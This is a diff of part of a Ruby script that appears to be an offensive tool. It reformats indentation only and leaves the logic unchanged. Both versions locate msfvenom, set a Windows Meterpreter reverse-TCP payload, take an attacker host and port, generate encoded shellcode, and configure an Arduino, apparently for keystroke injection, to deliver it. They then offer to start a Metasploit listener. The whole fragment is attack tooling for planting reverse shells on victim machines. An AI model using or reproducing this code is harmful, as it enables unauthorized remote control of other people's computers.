@@ -327,21 +327,20 @@ system("#{msf_path}./msfconsole -r #{rc_file}")
 end
 
 begin
-  msf_path = if File.exist?("#{ENV['PREFIX']}/bin/msfvenom")
-               "#{ENV['PREFIX']}/bin/"
-             elsif File.exist?('/opt/metasploit-framework/msfvenom')
-               '/opt/metasploit-framework/'
-             else
-               print_error("Metasploit not found!"); exit
-             end
-
-  @set_payload = 'windows/meterpreter/reverse_tcp'
-  host = select_host
-  port = select_port
-  encoded = shellcode_gen(msf_path, host, port)
-  shell_setup(encoded)
-  arduino_setup(host)
-
-  if rgets('Start listener? [yes/no]: ') == 'yes'
-    metasploit_setup(msf_path, host, port)
-  end
+if File.exist?("#{ENV['PREFIX']}/bin/msfvenom")
+msf_path = "#{ENV['PREFIX']}/bin/"
+elsif File.exist?('/opt/metasploit-framework/msfvenom')
+msf_path = ('/opt/metasploit-framework/')
+else
+print_error('Metasploit Not Found!')
+exit
+end
+@set_payload = 'windows/meterpreter/reverse_tcp'
+host = select_host
+port = select_port
+encoded = shellcode_gen(msf_path, host, port)
+shell_setup(encoded)
+arduino_setup(host)
+if rgets('Start listener? [yes/no]: ') == 'yes'
+metasploit_setup(msf_path, host, port)
+end
